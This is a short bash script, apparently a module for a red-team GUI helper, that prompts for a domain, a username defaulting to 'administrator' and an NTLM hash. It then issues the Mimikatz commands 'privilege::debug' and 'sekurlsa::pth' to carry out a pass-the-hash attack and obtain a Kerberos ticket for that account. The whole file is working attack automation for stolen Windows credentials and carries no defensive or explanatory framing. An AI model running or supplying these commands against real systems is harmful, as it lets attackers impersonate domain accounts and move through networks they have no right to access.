#!/bin/bash

: '
Mimikatz: get tgt ticket
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
DOMAIN_FIELD=$(form_item  "domain" "domain")
USERNAME_FIELD=$(form_item  "username" "username" "administrator")
HASH_FIELD=$(form_item  "hash" "hash")

# Generate GUI form
generate_form "${DOMAIN_FIELD}" "${USERNAME_FIELD}" "${HASH_FIELD}"

DOMAIN=${form_data["domain"]}
USERNAME=${form_data["username"]}
HASH=${form_data["hash"]}

execute_command "privilege::debug"
create_new_line
sleep 1

execute_command "sekurlsa::pth /domain:${DOMAIN} /user:${USERNAME} /ntlm:${HASH}"
create_new_line
